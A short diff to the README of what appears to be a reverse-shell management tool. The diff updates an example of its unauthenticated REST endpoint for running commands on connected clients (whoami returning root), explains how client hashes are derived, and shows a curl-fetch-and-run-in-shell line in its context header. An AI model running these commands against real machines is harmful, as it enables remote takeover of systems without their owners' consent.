@@ -88,12 +88,18 @@ sh -c "$(curl http://host:port/)"
 ```
 * `POST /client/:hash` execute a command on a specific client
 ```
-# curl -X POST 'http://host:port/client/4f571d895f019702e017658f2246a7eb' --data 'cmd=whoami'
+# curl -X POST 'http://host:port/client/d14a421389af9436d7d4181774077dab' --data 'cmd=whoami'
 {
     "status": true,
     "msg": "root\n",
 }
 ```
+* How to hash?
+```
+# echo -n "127.0.0.1:54798" | md5sum
+d14a421389af9436d7d4181774077dab
+```
 
 #### TODO
 - [ ] More interfaces in RESTful API
+- [ ] RESTful API should auth
